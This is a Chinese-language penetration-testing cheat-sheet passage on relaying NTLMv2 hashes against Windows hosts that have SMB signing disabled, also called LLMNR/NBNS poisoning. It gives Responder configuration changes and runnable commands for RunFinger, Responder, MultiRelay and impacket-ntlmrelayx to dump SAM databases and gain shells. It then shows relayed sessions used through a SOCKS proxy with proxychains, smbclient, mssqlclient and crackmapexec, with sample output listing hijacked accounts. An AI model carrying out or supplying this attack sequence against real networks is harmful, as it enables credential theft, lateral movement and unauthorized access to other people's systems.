	如果机器具有SMB signing: disabled，则可以使用带有 Multirelay.py 脚本的 Responder 来执行NTLMv2 hashes relay并获得机器上的shell访问权限。也称为LLMNR/NBNS毒害
	打开 Responder.conf 文件并将 和 的值SMB设置HTTP为Off。
	[Responder Core]
	; Servers to start
	...
	SMB = Off     # Turn this off
	HTTP = Off    # Turn this off

	运行python RunFinger.py -i IP_Range以检测机器SMB signing：disabled
	>python Responder.py -I <interface_card>
	使用中继工具，例如ntlmrelayx或MultiRelay
	>impacket-ntlmrelayx -tf targets.txt 转储列表中目标的 SAM 数据库。
	>python MultiRelay.py -t <target_machine_IP> -u ALL
	ntlmrelayx 还可以充当每个受损会话的 SOCK 代理。
```bash
$ impacket-ntlmrelayx -tf /tmp/targets.txt -socks -smb2support
[*] Servers started, waiting for connections
Type help for list of commands
ntlmrelayx> socks
Protocol  Target          Username                  Port
--------  --------------  ------------------------  ----
MSSQL     192.168.48.230  VULNERABLE/ADMINISTRATOR  1433
SMB       192.168.48.230  CONTOSO/NORMALUSER1       445
MSSQL     192.168.48.230  CONTOSO/NORMALUSER1       1433

使用"-t"选择一个目标
impacket-ntlmrelayx -t mssql://10.10.10.10 -socks -smb2support
impacket-ntlmrelayx -t smb://10.10.10.10 -socks -smb2support

socks 代理可以与您的 Impacket 工具或 CrackMapExec 一起使用
$ proxychains impacket-smbclient //192.168.48.230/Users -U contoso/normaluser1
$ proxychains impacket-mssqlclient DOMAIN/USER@10.10.10.10 -windows-auth
$ proxychains crackmapexec mssql 10.10.10.10 -u user -p '' -d DOMAIN -q "SELECT 1"   
```